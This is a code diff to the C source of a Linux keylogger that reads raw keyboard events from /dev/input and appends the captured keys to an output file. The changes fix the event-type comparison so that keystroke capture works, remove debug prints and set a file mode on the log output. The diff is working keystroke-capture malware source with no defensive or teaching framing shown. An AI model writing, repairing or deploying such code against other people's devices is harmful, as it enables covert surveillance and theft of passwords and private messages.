@@ -137,7 +137,7 @@ void keylogger_init(int keyboard_fd, int outfd){
         bytes_read = read(keyboard_fd, events, event_size * 128);
 
         for (int i = 0; i < (bytes_read/event_size); ++i){
-            if (events[i].type = EV_KEY){
+            if (events[i].type == EV_KEY){
                 if (events[i].value == 1){
                     if (events[i].code > 0 && events[i].code < NUM_KEYCODES){
                         write_to_out(outfd, keycodes[events[i].code], keyboard_fd);
@@ -182,13 +182,8 @@ char * obtain_event_file(){
             int32_t keyboard_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
 
             snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);
-
-            printf("%s\n", filename);
             
             int keyboard_fd = open(filename,O_RDONLY);
-
-            printf("reached here\n");
-            printf("the value of keyboard fd is %d\n", keyboard_fd);
 
             if (keyboard_fd < 0){
                 perror("open");
@@ -225,13 +220,14 @@ int main(int argc, char ** argv){
 
     //check /dev/input directory for the keyboard input file
     char * keyboard_device = obtain_event_file();
+    printf("keyboard file: %s\n", keyboard_device);
     if (keyboard_device == NULL){
         fprintf(stderr, "Error: Keyboard device not connected.");
         exit(1);
     }
 
     int output_fd;
-    output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT);
+    output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
     if (output_fd < 0){
         perror("output file: open");
     }
